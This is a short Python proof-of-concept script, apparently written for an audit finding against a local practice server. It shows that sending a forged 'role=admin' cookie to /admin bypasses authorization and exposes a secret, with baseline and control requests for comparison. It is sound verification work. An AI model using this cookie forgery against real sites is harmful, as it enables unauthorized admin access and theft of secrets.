#!/usr/bin/env python3
"""PoC (in-code step, F-1): admin panel takeover via forged role cookie.

EDUCATIONAL - run against the local practice target only.
Trigger : GET /admin with header `Cookie: role=admin`.
Effect  : 200 + admin panel body including "SECRET: internal transfer keys",
          where an unauthenticated client otherwise gets 403.
Boundary: client-asserted authorization (cookie) -> server privilege decision.
Ladder  : theoretical -> in-code (this file). Exit 0 = reproduced.
"""
import sys
import urllib.request

BASE = "http://127.0.0.1:8765"


def get(path: str, cookie: str = "") -> tuple[int, str]:
    req = urllib.request.Request(BASE + path)
    if cookie:
        req.add_header("Cookie", cookie)
    try:
        with urllib.request.urlopen(req) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")


def main() -> int:
    code0, body0 = get("/admin")
    print(f"[baseline] GET /admin (no cookie)      -> HTTP {code0} (expect 403)")
    code1, body1 = get("/admin", "role=user")
    print(f"[control ] GET /admin (role=user)      -> HTTP {code1} (expect 403)")
    code2, body2 = get("/admin", "role=admin")
    secret = "SECRET: internal transfer keys"
    ok = code2 == 200 and secret in body2
    print(f"[attack  ] GET /admin (role=admin)     -> HTTP {code2} (expect 200)")
    print(f"[attack  ] admin body contains secret: {secret in body2}")
    if not (code0 == 403 and code1 == 403 and ok):
        print("FAIL: admin takeover not reproduced")
        return 1
    print("REPRODUCED: forged role=admin cookie grants the admin panel and its secret")
    print("--- transcript (attack response) ---")
    print(f"HTTP/1.0 {code2}")
    print(body2)
    return 0


if __name__ == "__main__":
    sys.exit(main())
